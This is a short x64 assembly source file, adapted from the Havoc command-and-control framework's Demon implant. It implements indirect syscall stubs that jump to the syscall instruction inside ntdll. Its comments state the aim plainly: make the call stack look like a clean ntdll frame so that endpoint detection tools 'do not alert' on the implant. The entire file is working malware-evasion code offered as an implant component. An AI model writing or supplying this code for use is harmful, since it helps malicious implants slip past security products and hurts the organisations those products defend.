; indirect_syscall.x64.asm
; Adapted from HavocFramework/Havoc payloads/Demon/src/asm/Syscall.x64.asm (MIT)
;
; Two exported functions:
;   SysSetConfig  — stores a pointer to SYS_CONFIG { PVOID SysAddr; WORD Ssn; } in r11
;   SysInvoke     — performs the indirect syscall
;
; The key difference from a direct syscall stub:
;   `jmp QWORD [r11]` jumps to the `syscall` instruction *inside ntdll*.
;   The CPU's return address therefore points into ntdll — not the implant.
;   Stack-walking EDRs see a clean ntdll call frame and do not alert.

[BITS 64]

DEFAULT REL

GLOBAL SysSetConfig
GLOBAL SysInvoke

SECTION .text

; SysSetConfig(SYS_CONFIG *cfg)
;   rcx = pointer to { PVOID SysAddr; WORD Ssn; }
;   Stores it in r11 for use by SysInvoke
SysSetConfig:
    mov r11, rcx
    ret

; SysInvoke(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, ...)
;   Mirrors the standard Nt calling convention:
;     rcx = arg1, rdx = arg2, r8 = arg3, r9 = arg4, stack = arg5+
;   r11 must point to SYS_CONFIG (set by SysSetConfig before each call)
SysInvoke:
    mov  r10, rcx                ; Nt functions save rcx in r10
    mov  eax, DWORD [r11 + 8]   ; load SSN from SYS_CONFIG.Ssn (offset 8 after PVOID)
    jmp  QWORD [r11]             ; jump to SysAddr (the `syscall` instr inside ntdll)
    ret
